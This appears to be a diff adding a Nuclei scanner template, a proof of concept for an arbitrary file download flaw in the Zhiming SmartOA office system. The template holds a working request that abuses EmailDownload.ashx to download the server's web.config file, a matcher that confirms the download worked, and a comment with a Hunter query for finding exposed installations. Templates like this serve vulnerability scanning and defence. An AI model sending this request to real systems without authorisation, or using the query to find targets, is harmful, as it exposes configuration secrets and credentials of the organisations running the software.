@@ -1,0 +1,27 @@
+# Add your nuclei formatted PoC!
+id: smart-oa-LFI
+
+info:
+  name: smart-oa-LFI
+  author: yoyo
+  severity: critical
+  description: 智明 smartoa EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息
+  tags: 智明oa,smart-oa,oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/file/EmailDownload.ashx?url=~/web.config&name=web.config'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "version"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+#hunter-query:app="智明协同-SmartOA"
